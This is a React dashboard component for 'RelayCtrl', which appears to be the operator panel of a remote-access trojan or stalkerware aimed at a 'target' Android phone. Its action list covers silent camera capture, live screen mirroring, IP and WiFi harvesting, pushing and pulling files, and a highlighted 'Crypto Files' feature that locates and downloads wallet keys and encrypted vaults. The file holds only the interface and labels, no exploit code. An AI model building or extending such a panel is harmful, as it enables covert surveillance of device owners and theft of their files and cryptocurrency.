import { useState } from 'react'
import ActivityModal from './ActivityModal'

const CONTROLS = [
  {
    key:    'generateLink',
    icon:   '🔗',
    title:  'Generate Link',
    desc:   'Create a shareable connection link for the target device',
    iconBg: 'bg-accent',
    special: false,
  },
  {
    key:    'getIpWifi',
    icon:   '📡',
    title:  'IP & WiFi Module',
    desc:   'Retrieve device IP address and WiFi network details',
    iconBg: 'bg-blue',
    special: false,
  },
  {
    key:    'mirrorScreen',
    icon:   '🖥️',
    title:  'Screen Mirror',
    desc:   'Stream the device display live to your browser',
    iconBg: 'bg-purple',
    special: false,
  },
  {
    key:    'snapImage',
    icon:   '📸',
    title:  'Snap Image',
    desc:   'Silently capture a photo from the device camera',
    iconBg: 'bg-orange',
    special: false,
  },
  {
    key:    'sendFiles',
    icon:   '📤',
    title:  'Send Files',
    desc:   'Push files from your machine directly to the device',
    iconBg: 'bg-green',
    special: false,
  },
  {
    key:    'downloadFiles',
    icon:   '⬇️',
    title:  'Download Files',
    desc:   'Pull any file from the remote device storage',
    iconBg: 'bg-teal',
    special: false,
  },
  {
    key:    'cryptoFiles',
    icon:   '🔐',
    title:  'Crypto Files',
    desc:   'Locate and download wallet keys & encrypted vaults',
    iconBg: 'bg-gold',
    special: true,
  },
]

export default function Dashboard() {
  const [modal, setModal] = useState(null)

  return (
    <>
      {/* ── Top bar ── */}
      <header className="topbar">
        <div className="logo">
          <div className="logo-icon">📡</div>
          <div className="logo-name">Relay<span>Ctrl</span></div>
        </div>
        <div className="topbar-right">
          <div className="online-badge">
            <span className="dot" />
            Device Online
          </div>
          <span className="device-tag">Samsung Galaxy S23 · Android 14</span>
        </div>
      </header>

      {/* ── Hero ── */}
      <div className="hero">
        <h1>Control Panel</h1>
        <p>Connection established. Select an action to begin your remote session.</p>
      </div>

      {/* ── Stats ── */}
      <div className="stats-row">
        <div className="stat-card">
          <div className="stat-label">Battery</div>
          <div className="stat-value c-green">78%</div>
        </div>
        <div className="stat-card">
          <div className="stat-label">Network</div>
          <div className="stat-value c-accent">LTE</div>
        </div>
        <div className="stat-card">
          <div className="stat-label">Storage Free</div>
          <div className="stat-value c-orange">18 GB</div>
        </div>
        <div className="stat-card">
          <div className="stat-label">Uptime</div>
          <div className="stat-value c-yellow">3d 14h</div>
        </div>
      </div>

      {/* ── Controls ── */}
      <div className="section-head">Actions</div>
      <div className="controls-grid">
        {CONTROLS.map(c => (
          <div
            key={c.key}
            className={`ctrl-card${c.special ? ' special' : ''}`}
            onClick={() => setModal(c.key)}
          >
            <div className={`cc-icon-wrap ${c.iconBg}`}>{c.icon}</div>
            <div className="cc-title">{c.title}</div>
            <div className="cc-desc">{c.desc}</div>
            <div className="cc-arrow">→</div>
          </div>
        ))}
      </div>

      {modal && (
        <ActivityModal featureKey={modal} onClose={() => setModal(null)} />
      )}
    </>
  )
}
